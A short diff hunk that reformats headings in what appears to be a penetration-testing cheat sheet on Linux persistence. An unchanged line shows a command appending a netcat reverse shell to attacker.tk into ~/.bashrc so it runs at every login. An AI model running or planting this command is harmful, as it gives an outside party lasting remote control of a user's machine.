@@ -9,9 +9,9 @@
 
 # PERSISTANT
 
-	## LINUX
+## LINUX
 	
-		* Autorun
+* Autorun
 		
 			bash$> echo "nc attacker.tk 8888 ‐e /bin/bash 2>/dev/null &" >>~/.bashrc
 			
